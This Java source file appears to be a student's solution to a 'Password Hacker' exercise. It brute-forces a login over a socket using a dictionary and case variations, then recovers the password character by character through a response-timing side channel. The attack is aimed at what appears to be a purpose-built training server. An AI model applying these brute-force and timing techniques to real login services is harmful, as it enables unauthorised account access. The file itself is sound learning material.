package hacker.main;

import com.google.gson.Gson;
import hacker.json.LoginPasswordPair;
import hacker.json.ServerResponse;

import java.io.*;
import java.net.Socket;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

import static hacker.data.Config.LOGINS_DIRECTORY;
import static hacker.main.Main.Responses.SUCCESS;
import static hacker.main.Main.Responses.WRONG_PASSWORD;

public class Main {
     enum Responses {
         WRONG_PASSWORD("Wrong password!"), SUCCESS("Connection success!");

        private final String message;
            
        Responses(String message) {
            this.message = message;
        }

        private String getMessage() {
            return message;
        }
    }

    public static void main(String[] args) throws IOException {
         /*





         IMPORTANT!!!
         Make sure to add Gson as a dependency each time you load IntelliJ. build.gradle is at C:\Users\andre\IdeaProjects\Password Hacker (Java)\build.gradle





          */
        String ipAddress = args[0]; int port = Integer.parseInt(args[1]);
        try (Socket socket = new Socket(ipAddress, port);
             DataInputStream input = new DataInputStream(socket.getInputStream());
             DataOutputStream output = new DataOutputStream(socket.getOutputStream())) {
            Gson gson = new Gson();
            String login = bruteForceLoginUsingDictionary(input, output).orElse("Login not found");
            String password = findPasswordUsingVulnerability(login, input, output).orElse("Password not found.");
            System.out.println(gson.toJson(new LoginPasswordPair(login, password)));
        }
    }

    /**
     * Brute force the login using the dictionary of logins.
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return an Optional containing either the correct login or nothing
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> bruteForceLoginUsingDictionary(DataInputStream input, DataOutputStream output) throws IOException {
        try (Reader reader = new FileReader(LOGINS_DIRECTORY)) {
            // Holds the current login being checked from passwords.txt
            StringBuilder commonLoginBuilder = new StringBuilder();
            // Holds each char that is read, used in the while loop
            int i;
            while ((i = reader.read()) != -1) {
                // Current character being read
                char currentCharacter = (char) i;
                // Checking for whitespace/linebreak
                if (Character.toString(currentCharacter).matches("\\s")) {
                    String commonLogin = commonLoginBuilder.toString();
                    // Doesn't need to try case combinations if the password is a number
                    if (commonLogin.matches("[0-9]+")) {
                        output.writeUTF(commonLogin);
                        // When it says wrong password, that means the login is correct
                        if (WRONG_PASSWORD.getMessage().equals(input.readUTF())) {
                            return Optional.of(commonLogin);
                        }
                    } else {
                        List<LoginPasswordPair> allCaseCombinations = generateCaseList(commonLogin);
                        Optional<String> possibleCorrectLogin = tryListOfLoginPasswordPairs(allCaseCombinations, input, output);
                        if (possibleCorrectLogin.isPresent()) {
                            return possibleCorrectLogin;
                        }
                    }
                    commonLoginBuilder = new StringBuilder();
                } else {
                    commonLoginBuilder.append(currentCharacter);
                }
            }
        }
        return Optional.empty();
    }

    /**
     * Finds the password using the vulnerability in stage 4 where an inputted password that matches the beginning of the correct password will return an exception
     * message.
     * @param login the correct login to use when finding the password
     * @param input the input stream to which to respond if the password was correct or not
     * @param output the output stream to which to send the attempted password
     * @return an Optional containing either the correct password or nothing
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> findPasswordUsingVulnerability(String login, DataInputStream input, DataOutputStream output) throws IOException {
         StringBuilder attemptedPasswordBuilder = new StringBuilder("a");
         int currentLength = 1;
         // The character which is being changed to try to find the password
         char volatileChar = 'a';
        while (true) {
            // 0 without apostrophes is null
            if (volatileChar == 0) {
                return Optional.empty();
            } else {
                attemptedPasswordBuilder.replace(currentLength - 1, currentLength, String.valueOf(volatileChar));
                // For measuring the delay of the response
                long startTime = System.currentTimeMillis();
                ServerResponse response = tryLoginPasswordPair(new LoginPasswordPair(login, attemptedPasswordBuilder.toString()), input, output);
                if (response.result().equals(SUCCESS.getMessage())) {
                    return Optional.of(attemptedPasswordBuilder.toString());
                // If there is a delay of greater than or equal to 100 milliseconds.
                    // 100 milliseconds was chosen via trial and error
                } else if (System.currentTimeMillis() - startTime >= 100) {
                    ++currentLength;
                    attemptedPasswordBuilder.append("a");
                    volatileChar = 'a';
                } else {
                    volatileChar = vulnerabilityNextCharacter(volatileChar);
                }
            }
        }
    }

    /**
     * Get the next character for use with the stage 4 vulnerability
     * @param character the character from which to get the next character
     * @return the next character
     */
    private static char vulnerabilityNextCharacter(char character) {
        // When going to the next character, it goes from a-z to A-Z to 0-9 and lastly to ascii code of 0, which is null
         if (character == 'z') {
             return 'A';
         } else if (character == 'Z') {
             return '0';
         } else if (character == '9' || character == 0) {
             return 0;
         }
         return (char) (character + 1);
    }

    /**
     * Takes a login password pair object and sends it to the sever, then returns the server response for that pair.
     * @param pair the pair object to be sent
     * @param input the input stream to which to respond if the pair was correct or not
     * @param output the output stream to which to send the attempted pair
     * @return the response from the server
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static ServerResponse tryLoginPasswordPair(LoginPasswordPair pair, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        String json = gson.toJson(pair, LoginPasswordPair.class);
        output.writeUTF(json);
        return gson.fromJson(input.readUTF(), ServerResponse.class);
    }

    /**
     * Takes a list of login password pairs. Always tries to find the correct login.
     * @param pairs the list of pairs to try
     * @param input the input stream to which to respond if the pair was correct or not
     * @param output the output stream to which to send the attempted pair
     * @return an Optional corresponding with the mode
     * @throws IOException if something goes wrong with the input/output of data
     */
    private static Optional<String> tryListOfLoginPasswordPairs(List<LoginPasswordPair> pairs, DataInputStream input, DataOutputStream output) throws IOException {
        Gson gson = new Gson();
        for (LoginPasswordPair pair : pairs) {
            String json = gson.toJson(pair, LoginPasswordPair.class);
            output.writeUTF(json);
            String response = gson.fromJson(input.readUTF(), ServerResponse.class).result();
            if (response.equals(WRONG_PASSWORD.getMessage())) {
                return Optional.of(pair.getLogin());
            }
        }
        return Optional.empty();
    }

    /**
     * Takes a String login as input and returns a list of login pairs
     * containing all case variations of the passed login.
     * @param login the login to get case variations of
     * @return the list of login pairs containing all case variations of the value
     */
    private static List<LoginPasswordPair> generateCaseList(String login) {
        BinaryFilter filter = new BinaryFilter(login.length());
        return Arrays.stream(filter.modifyStringAllCombinations(login, Character::toUpperCase)).map(x -> new LoginPasswordPair(x, "a")).toList();
    }

}
